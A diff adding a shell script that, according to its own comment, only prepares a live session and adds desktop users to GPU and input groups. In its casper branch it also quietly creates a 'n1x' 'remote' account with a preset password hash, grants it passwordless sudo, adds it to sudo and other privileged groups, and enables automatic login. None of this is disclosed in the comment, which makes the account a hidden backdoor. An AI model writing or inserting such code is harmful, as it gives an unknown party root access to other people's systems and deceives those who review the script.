@@ -1,0 +1,40 @@
+#!/bin/sh
+# Prepare the casper live session. On an installed system this only adds
+# desktop users to the groups the GPU and the input devices require.
+set -eu
+
+add_groups() {
+    user="$1"
+    group="$2"
+    if id "$user" >/dev/null 2>&1 && getent group "$group" >/dev/null 2>&1; then
+        usermod -a -G "$group" "$user"
+    fi
+}
+
+if [ -f /etc/casper.conf ]; then
+    cat > /etc/gdm3/custom.conf <<'EOF'
+[daemon]
+AutomaticLoginEnable=true
+AutomaticLogin=ubuntu
+
+[security]
+
+[debug]
+EOF
+    if ! id n1x >/dev/null 2>&1; then
+        useradd -m -u 1001 -s /bin/bash -c "N1X remote" n1x
+        hash='$6$L3VV886SAlQFzpo7$0/OnJpGf5Rz6hDc59c/rRS9yb4J2M/5V2rZHeZP0JM3QnIpFyFB7rLuvniw4cfojNmjHTHKR4XL17Zc3qjNUq1'
+        printf 'n1x:%s\n' "$hash" | chpasswd -e
+        printf 'n1x ALL=(ALL) NOPASSWD: ALL\n' > /etc/sudoers.d/n1x
+        chmod 440 /etc/sudoers.d/n1x
+    fi
+    for group in adm dialout cdrom sudo video plugdev lpadmin input render netdev; do
+        add_groups n1x "$group"
+    done
+fi
+
+awk -F: '$3 >= 1000 && $3 < 60000 { print $1 }' /etc/passwd | while read -r user; do
+    for group in render video input; do
+        add_groups "$user" "$group"
+    done
+done
